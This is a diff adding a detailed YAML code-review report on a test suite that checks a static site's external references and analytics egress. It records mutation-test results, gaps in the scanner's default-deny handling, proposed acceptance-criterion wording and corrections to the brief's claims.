+      I judge that ADEQUATELY COVERED for our own bytes, and the reason is the
+      round's own assertion: `counted` and `uncounted` are byte-identical except
+      for one snippet line in exactly the pages `report.counted` names, and that
+      equality is mutation-resistant (M-B1/M-B3/M-B4 all killed). Uncounted is
+      browser-closed; counted = uncounted + one allow-listed line; and the static
+      scan reads every byte either tree holds. AC-391's `assert blocked` plus
+      `all(any(host in request ...))` even observes that the counted page's egress
+      attempt goes to an allow-listed host.
+
+      The genuinely uncovered part is what the third-party script DOES once it
+      runs, which is DEC-046's vendor premise and is not testable offline -- and
+      which F-001 means the suite currently exercises for real without asserting
+      anything about it. So the residual is "the vendor's script is unmeasured",
+      not "the deployed tree is untested". A counted-tree egress control is cheap
+      and would be worth having after F-001's interceptor lands (tap the requests
+      on `counted_host`, assert each is same-origin or allow-listed), but I do not
+      call it owed.
+    recommendation: "Re-word the card's residual paragraph to this narrower claim. Optionally add the request tap to AC-391 once F-001's interceptor is in."
+    confidence: high
+    source: measured
+
+judgements_requested:
+  "1_counted_vs_uncounted_byte_assertion": >-
+    IT GENUINELY CONSTRAINS. Driven, not reasoned about: three independent widening
+    mutants, each killed at a DIFFERENT assertion line. A `<link rel=preconnect>`
+    added alongside the tag dies at :2404 on the per-file byte equality; a page
+    counted but left out of `report.counted` dies at :2399 (`differs ==
+    sorted(direct.counted)`) AND at :2589 in AC-392; a non-html file changed by
+    counting dies at :2399. A second tag cannot even be constructed --
+    `with_analytics` refuses on the attribute marker, and that refusal is itself
+    tested with a DIFFERENT endpoint, which is the case a URL-keyed marker would
+    have admitted. This is the strongest thing in the card.
+    On "the deployed tree is never the tested tree": the framing is false as
+    stated -- see F-010. Adequately covered, with a narrower residual named.
+  "2_edited_bookkeeping_test": >-
+    TEETH KEPT, and in the catching direction STRENGTHENED. M-A: a fourth ref in
+    requirements.yml naming a node nothing defines reds the test at :1919
+    (`assert refs - defined == set()`). Before the edit the same half was
+    `refs - defined == card_285`, an equality against three specific names -- which
+    also caught a fourth, so nothing was lost. And `refs & defined == card_284 |
+    card_285` now pins the intersection exactly, so a seventh ref for this file
+    cannot be added silently either. The one direction NEITHER version covers is
+    the docstring's own wording, "a ref that IS defined here must be in the
+    registry": a NEW test defined here and absent from the registry grows `defined`
+    only, leaves `refs` alone, and the intersection is unchanged. That wording was
+    already there before this card and is still the weaker reading of what is
+    asserted; worth correcting, not worth a finding. Also verified: NO Playwright
+    suite body was edited -- tests/ has exactly one file in the diff
+    (test_public_player_pages.py, 971/15), and tests/test_public_player.py and
+    tests/test_puzzle_solver_page.py are byte-unchanged.
+  "3_adr_0039_r2_declared_tripwire_plus_derived_closure": >-
+    NOT SATISFIED AS IT STANDS, and the reason is R2's own text rather than taste.
+    R2 reads: "A guard's set is derived from an authority the runtime can enumerate,
+    not hand-written. Where no such authority exists, the guard defaults to deny: a
+    shape it cannot analyse is a FAILURE, never a silent pass". So the round's
+    structure -- declared trip-wire plus derived closure -- IS the structure R2
+    prescribes, and the unenumerable-set argument is correct and well evidenced
+    (CARD-282's 7-of-7 miss is the right precedent; 22 compound shapes; the
+    `fingerprint` measurement reproduces at exactly 7 hits, 5 in solver_state.js
+    and 2 in play.js, all grids). The derived half is also genuinely derived: I
+    confirmed the references come from the tree's own files, the permitted set from
+    docs/deploy/player.md through the driver's own parser (`driver.allow_list`, the
+    same function the deploy command calls), and the routes from the tree's own
+    vercel.json through CARD-283's `rewrites()`. Nothing is a literal in the test.
+    But the exemption R2 grants is CONDITIONAL on default-deny, and default-deny is
+    where it fails: four measured silent passes (F-002 x2, F-005 x2, plus F-006's
+    scope hole). So today it is not a denylist wearing a derivation's clothes -- the
+    derivation is real -- it is a derivation with holes in the half that carries the
+    rule. ADR-0041/R6's load is on "the egress set is closed"; the egress set is not
+    closed. Fix F-002 (one character class, verified) and F-005 and the argument
+    becomes sound. And the bound is NOT stated where a reader meets the claim -- see
+    F-008; the deploy page states the opposite.
+  "4_comment_stripping_asymmetry": >-
+    The asymmetry ITSELF is defensible and I verified both halves (C1/C3/C4 caught,
+    C2 silent). A full URL is never prose and an endpoint parked in a comment is
+    something a reviewer should see; a rooted path in a comment is documentation,
+    and solver_state.js:6 is the real case that proves it. Being stricter on the
+    absolute form costs nothing because both are inert. So: right asymmetry.
+    BUT the heuristic that implements it is a hole, not just a declared cost. The
+    docstring declares one cost -- "a string whose content held a bare `//` would be
+    truncated" -- and I confirmed that cost is zero on today's tree (no bare `//`
+    inside any quoted string in the served site). It does not declare the other
+    consequence of the same regex, which is F-002: the stripper destroys LIVE
+    protocol-relative references in code, and kills the two code paths written to
+    classify them. That is the finding. The `//`-inside-a-string mis-handling is
+    real and measured (p4) but secondary.
+  "5_wanted_ac_392_wording": |
+    I agree the wording is owed an amendment, and for exactly the reason the round
+    gives -- "the only analytics endpoint" is singular, the integration is two
+    origins, and vercel.json's $schema is a third external reference that is not
+    analytics at all. A scanner enforcing the literal AC would have red on a file
+    CARD-283 shipped. My exact wanted wording for requirements.yml FR-045 AC-392:
+
+      given: the assembled site
+      when:  its files are scanned
+      then:  no reference in it names a visitor IP or a per-visitor identifier,
+             every external reference it carries is one docs/deploy/player.md
+             declares -- in that page's runtime allow-list for the endpoints a
+             visitor's browser fetches, or in its non-runtime allow-list for
+             references nothing fetches at page load -- and a reference shape the
+             scan cannot classify is a failure
+      kind:  negative
+      test:  tests/test_public_player_pages.py::test_no_homegrown_tracking
+
+    Three deliberate changes: "the only analytics endpoint" -> "every external
+    reference ... one that page declares", which is both satisfiable and the
+    stronger claim; the two blocks named without counting them, so adding a third
+    runtime endpoint is a doc edit and not an AC edit; and the default-deny clause
+    promoted into the AC, because it is the property F-002 and F-005 break and an
+    AC that does not say it cannot notice. Counts stay out of the AC entirely -- the
+    page is the authority, and `REQUIRED_RUNTIME` already closes the set the
+    assembler needs. The identifier vocabulary's declared-trip-wire status belongs
+    in the FR's comment block beside the AC, not in the `then:`.
+  "6_card_amendments": "see card_amendments_owed"
+  "7_measured_wrong": "see corrections_to_the_record"
+
+corrections_to_the_record:
+  - target: "the orchestrator's brief"
+    claim: "'the box is at load 22.25 on 11 cores'"
+    measured: "Load averages 6.59 / 13.31 / 11.00 at the start of this cycle. The 1-minute figure had fallen by a factor of three by the time I ran; no run of mine took over 20 s and the hang guard never fired. Not a defect in anything -- recorded because the brief told me to re-measure before attributing slowness, and there was none to attribute."
+  - target: "the orchestrator's brief and the round's report"
+    claim: "'the handler records (text, location.url) and exempts by the located URL'"
+    measured: "WRONG as stated. The predicate is `host in entry[0] or host in entry[1]` -- text OR url. See F-007. The property the claim is about survives (M-D killed), but the mechanism is not what either document says."
+  - target: "the round's report and the scanner's own docstring"
+    claim: "'A shape the scanner cannot classify is a FAILURE, never a silent pass' / 'the egress set is closed, so there is no channel a visitor identifier could leave by'"
+    measured: "FALSE in four shapes, all planted and scanned: a protocol-relative `src=`, a protocol-relative CSS `url()`, an attribute assigned from a non-literal, and a `new Worker(...)`. See F-002 and F-005."
+  - target: "docs/deploy/player.md's allow-list section"
+    claim: "'fails on any external reference that is not here -- and on any reference whose target it cannot classify at all'"
+    measured: "FALSE, same four shapes; plus a live `<script src>` to the NON-RUNTIME entry scans clean (F-006)."
+  - target: "the brief's §3"
+    claim: "'IDENTIFIER_SHAPES, 22 regexes'"
+    measured: "CONFIRMED, exactly 22 (len() printed in the scratch tree)."
+  - target: "the brief's §3 and the round's report"
+    claim: "'the tree has 7 legitimate grid fingerprints'"
+    measured: "CONFIRMED, exactly 7 -- solver_state.js 5, play.js 2, case-insensitive, on the counted tree. The compound-vocabulary control is a real requirement and not a style choice."
+  - target: "the brief's §3"
+    claim: "'dropping count from the parsed allow-list makes the site's own tag foreign on exactly the 3 files report.counted names'"
+    measured: "CONFIRMED by running the node (it asserts exactly that), and independently by M-B3, which perturbs `report.counted` and reds the equality. This IS the control with teeth, as the brief says: it shows the site is clean because the doc names the endpoint."
+  - target: "the brief's §4"
+    claim: "'AC-391's two reached-instrument controls (assert blocked, assert console) are present'"
+    measured: "CONFIRMED, both present at the end of the test; and M-D proves the exemption they guard is narrow."
+  - target: "the brief's 'how to measure' section"
+    claim: "'the setrlimit skip is at tests/test_book_pdf_memory.py:1297, :1296 is the if verdict guard'"
+    measured: "CONFIRMED. :1294 is the closing docstring, :1295 the verdict assignment, :1296 the guard, :1297 the pytest.skip. The brief has it right this time; the card's correction was right."
+  - target: "the brief's G-2 note"
+    claim: "'the node-id string appears in 57 tracked files and exactly one is a .py file, which is prose'"
+    measured: "CONFIRMED: 80 tracked in total, 57 non-Markdown, 1 `.py` -- tests/test_admin_serving.py:134, inside a docstring in double backticks. The def is at tests/test_export_pdf.py:1249 and the node passes."
+  - target: "the brief's operating conditions"
+    claim: "'scripts/impact_set.py --base 464ae377 returns FULL'"
+    measured: "CONFIRMED -- the tool prints exactly `FULL`. Fail-closed, not a defect; no narrowed impact set exists for this card."
+  - target: "the round's report"
+    claim: "'both player modules 66 passed 0 skipped; -m browser 22 passed 44 deselected; no Chromium skip; node ids 9748 -> 9755 +7/-0; _conditional_silences == [] for all three sources'"
+    measured: "EVERY ONE REPRODUCED, independently, including the cut's 9748 from a scratch worktree at 464ae377. The round's own record is accurate throughout -- the only thing in it I found wrong is the AC-391 exemption mechanism (F-007)."
+  - target: "the card's G-3"
+    claim: "'behavioral -- AC-3 is its evidence'"
+    measured: "There is no AC-3. FR-045's criteria are AC-380..AC-392 (grepped the whole FR block). Stale from the 2026-10-23 renumbering the handoff records. Should read AC-392."
+
+card_amendments_owed:
+  - "AC-392's `then:` -- the wording in judgements_requested.5_wanted_ac_392_wording, in meta/architecture/requirements.yml and in the card's Acceptance criteria block. The round is right that the AC's intent is met and its count is not literally satisfiable."
+  - "G-3 says 'behavioral -- AC-3 is its evidence'. FR-045 has no AC-3; it should name AC-392. Stale cross-reference from the 2026-10-23 AC renumbering."
+  - "Card item 4 instructs 'note on CARD-210 that its two blockers are now one decision away from clear' -- a meta/ edit the round was forbidden, correctly not done. What it reported instead IS sufficient for CARD-210 to consume: docs/deploy/player.md's qr-url-shapes block is machine-readable, parsed by `driver.qr_shapes`, and held to vercel.json's rewrite sources by test_the_qr_url_shapes_here_are_the_shipped_routes (I read the test: it reduces each documented shape to vercel's `:name` form and asserts set equality against the shipped sources, which is the right authority). The one missing fact, the base, is correctly marked TODO(owner) and NOT observed. Amend item 4 to say the note is the orchestrator's or the owner's edit at merge, not the implementer's, so the next card does not inherit an instruction it cannot execute."
+  - "F-001: record that AC-390's browser journey must run with the analytics hosts intercepted, and why (the deploy page's own 'Do not count locally' rule). This is the kind of thing that comes back if only the code changes."
+  - "F-008: the declared/derived bound belongs in docs/deploy/player.md's Usage-counting section, not only in a test-module comment; and the two sentences there that overclaim the scan's reach need striking or qualifying."
+  - "The round's AC-391 sentence about the exemption mechanism (F-007) is wrong in the card's own record and should be corrected where it is written, since the next reader will take it as the design."
+  - "Standard fields at close: Review score, Actual, Closed, Merge commit."
+  - "Touches is accurate -- player/**, docs/deploy/player.md, scripts/**, tests/test_public_player_pages.py -- and matches the diff exactly. No narrowing owed."
+
+dead_ref_hygiene: >-
+  This report is synced into main, where the check-ref search is a TEXT search over
+  tracked files and meta/review/** is not excluded. THIS CARD'S OWN THREE REFS NOW
+  HAVE DEFINITIONS -- test_assembled_site_is_self_contained at
+  tests/test_public_player_pages.py:2299, test_pages_work_with_analytics_blocked at
+  :2454, test_no_homegrown_tracking at :2548, all three collected by pytest in this
+  cycle -- so naming them in full is honest and not a revival. Every other
+  `path::name` spelled in this file was likewise collected in this cycle and is
+  alive: the four other new nodes, the amended bookkeeping test,
+  tests/test_export_pdf.py::test_the_dependency_baseline_is_still_closed (def at
+  :1249, run green), and test_the_guard_sets_are_derived_and_not_hand_written (def
+  at tests/test_suite_profile.py:4149).
+  ONE name is deliberately NOT spelled: ADR-0006/R1's dependency-baseline CLASS ref,
+  which has zero definitions and roughly 109 prose resolvers. I verified G-2 by the
+  `def` at tests/test_export_pdf.py:1249 and by running that node, never by that
+  class name, and this file does not contain it.
+  SEPARATELY, and this is F-003: I have deliberately NOT spelled either GoatCounter
+  endpoint URL anywhere in this report, because
+  tests/test_public_player_pages.py::test_the_deploy_page_is_the_only_place_that_holds_an_endpoint
+  asserts the `git grep` for each of them returns docs/deploy/player.md and nothing
+  else -- with no pathspec, so a review YAML quoting one RED the suite once synced
+  into main. I measured that. Cycle 2's reviewer needs the same care until F-003 is
+  fixed.
+
+deferred:
+  - "mutation beyond M-A/M-B1/M-B3/M-B4/M-C/M-D -- deferred(cost): three gating findings this cycle, so Step 8f's ladder puts the rest after the fix round."
+  - "the full suite -- the merge gate's, and impact_set returns FULL so no narrowed reading exists."
+  - "timings -- three cards in flight on this box; any figure would be noise."
+  - "a counted-tree request-set closure control (F-010) -- not owed, worth having after F-001's interceptor lands."
+
+next_cycle_entry_conditions:
+  - "F-001 fixed (two lines, verified green) or refused with a measurement showing the suite does not reach the network."
+  - "F-002 fixed (one character class, verified green) and given a planted protocol-relative probe, or the three overclaiming sentences struck."
+  - "F-003 fixed (one pathspec, verified green) -- this one blocks cycle 2's own report from quoting the endpoint."
+  - "F-004, F-005 and F-006 are all in the same function and the same control set as F-002; fixing them in one round is the economical path. F-004 and F-006 each close an ADR-0039/R1-R3 control gap and are cheap."
+  - "The AC-392 wording and the G-3 AC-3 reference amended, since both are one-line registry/card edits."
